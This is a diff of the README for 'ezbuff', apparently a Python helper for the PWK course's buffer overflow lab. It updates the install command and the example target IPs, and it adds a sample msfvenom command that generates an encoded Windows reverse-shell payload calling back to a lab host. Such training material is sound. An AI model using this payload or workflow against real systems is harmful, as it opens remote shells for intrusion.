@@ -3,7 +3,7 @@ Ezbuff is a Python package created to make the **2020 PWK buffer overflow** easi
 
 ## Installation
 ```python
-pip install ezbuff
+pip3 install ezbuff
 ```
 
 ## Usage
@@ -14,7 +14,7 @@ from ezbuff.src.overflow import Overflow
 
 def main():
 	# Instanstantiate `Overflow` object
-	test = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)
+	test = Overflow("10.10.10.10", 80, max_fuzz_bytes=2000)
 
 	# Change the target IP if running in interactive Python interpreter
 	test.targ_ip = "10.10.10.1"
@@ -53,4 +53,9 @@ def main():
 
 if __name__ == '__main__':
 	main()
+	
+# Sample payload with Msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=
+# thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
+
+# Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options! 
 ```
